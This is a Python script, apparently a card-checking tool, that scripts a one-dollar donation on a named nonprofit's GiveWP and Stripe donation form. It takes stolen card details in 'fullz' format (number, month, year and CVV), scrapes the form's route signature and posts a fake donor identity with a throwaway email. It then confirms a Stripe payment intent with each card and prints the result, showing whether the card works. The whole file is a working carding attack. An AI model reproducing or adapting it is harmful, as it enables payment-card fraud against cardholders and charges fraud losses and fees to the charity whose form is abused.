import asyncio
import requests
import re
import html
import json
from urllib.parse import urlparse, parse_qs

async def create_cvv_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        response = session.get('https://livingroomconversations.org/donate/', headers=headers, verify=False)

        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': headers['user-agent'],
        }

        params = {
            'givewp-route': 'donation-form-view',
            'form-id': '1272',
            'locale': 'en_US',
        }

        response = session.get('https://livingroomconversations.org/', params=params, headers=headers, verify=False)
        html_text = response.text

        m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
        if not m:
            return {"success": False, "error": "donateUrl not found"}

        donate_url = html.unescape(m.group(1))
        q = parse_qs(urlparse(donate_url).query)

        sig = q.get("givewp-route-signature", [""])[0]
        exp = q.get("givewp-route-signature-expiration", [""])[0]

        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'origin': 'https://livingroomconversations.org',
            'referer': 'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': headers['user-agent'],
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': sig,
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': exp,
        }

        data = {
            'amount': (None, '1'),
            'currency': (None, 'USD'),
            'donationType': (None, 'single'),
            'subscriptionPeriod': (None, 'one-time'),
            'subscriptionFrequency': (None, '1'),
            'subscriptionInstallments': (None, '0'),
            'formId': (None, '1272'),
            'gatewayId': (None, 'stripe_payment_element'),
            'feeRecovery': (None, '0'),
            'fundId': (None, '1'),
            'firstName': (None, 'John'),
            'lastName': (None, 'David'),
            'anonymous': (None, 'false'),
            'email': (None, 'cafimev982@rikrod.com'),
            'country': (None, 'US'),
            'address1': (None, '1290 6th Avenue'),
            'address2': (None, 'Floor 6'),
            'city': (None, 'New York'),
            'state': (None, 'NY'),
            'zip': (None, '10080'),
            'mailchimp': (None, 'true'),
            'donationBirthday': (None, ''),
            'originUrl': (None, 'https://livingroomconversations.org/donate/'),
            'isEmbed': (None, 'true'),
            'embedId': (None, 'give-form-shortcode-1'),
            'locale': (None, 'en_US'),
            'gatewayData[stripePaymentMethod]': (None, 'card'),
            'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'),
            'gatewayData[formId]': (None, '1272'),
            'gatewayData[stripeKey]': (None, 'pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY'),
            'gatewayData[stripeConnectedAccountId]': (None, 'acct_1BI2rXLb2HpJQ5gR'),
        }

        response = session.post('https://livingroomconversations.org/', params=params, headers=headers, data=data, verify=False)
        resp = json.loads(response.text)

        client_secret = resp["data"]["clientSecret"]
        payment_intent = client_secret.split("_secret")[0]
        return_url = resp["data"]["returnUrl"]
        qs = parse_qs(urlparse(return_url).query)
        receipt_id = qs.get("givewp-receipt-id", [""])[0] or qs.get("receipt-id", [""])[0]

        if receipt_id:
            final_return_url = (
                "https://livingroomconversations.org/donate/"
                "?givewp-event=donation-completed"
                "&givewp-listener=show-donation-confirmation-receipt"
                f"&givewp-receipt-id={receipt_id}"
                "&givewp-embed-id=give-form-shortcode-1"
            )
        else:
            final_return_url = return_url

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': headers['user-agent'],
        }

        data = {
            "return_url": final_return_url,
            "payment_method_data[billing_details][name]": "John David",
            "payment_method_data[billing_details][email]": "cafimev982@rikrod.com",
            "payment_method_data[billing_details][address][city]": "New York",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][line1]": "1290 6th Avenue",
            "payment_method_data[billing_details][address][line2]": "Floor 6",
            "payment_method_data[billing_details][address][postal_code]": "10080",
            "payment_method_data[billing_details][address][state]": "NY",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[payment_user_agent]": "stripe.js/6675c28e57; stripe-js-v3/6675c28e57; payment-element; deferred-intent; autopm",
            "payment_method_data[referrer]": "https://livingroomconversations.org",
            "payment_method_data[time_on_page]": "61010",
            "payment_method_data[client_attribution_metadata][client_session_id]": "d7931213-90c7-430b-a30d-879fbb1cee23",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": "ca492a5c-5c6a-471b-939e-fcba058a6866",
            "payment_method_data[guid]": "29101f49-0f52-4b49-aa4f-542d77eba591483f41",
            "payment_method_data[muid]": "00d8dd6e-8be1-4d4c-8eb4-657da4c8fd996b4426",
            "payment_method_data[sid]": "a196b663-d81f-4894-92df-c1c8358db90ee1e20d",
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "use_stripe_sdk": "true",
            "key": "pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY",
            "_stripe_account": "acct_1BI2rXLb2HpJQ5gR",
            "client_secret": client_secret
        }

        response = session.post(
            f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
            headers=headers,
            data=data,
            verify=False
        )

        print(response.text)
        await asyncio.sleep(2)
        return response
    except Exception as e:
        return str(e)
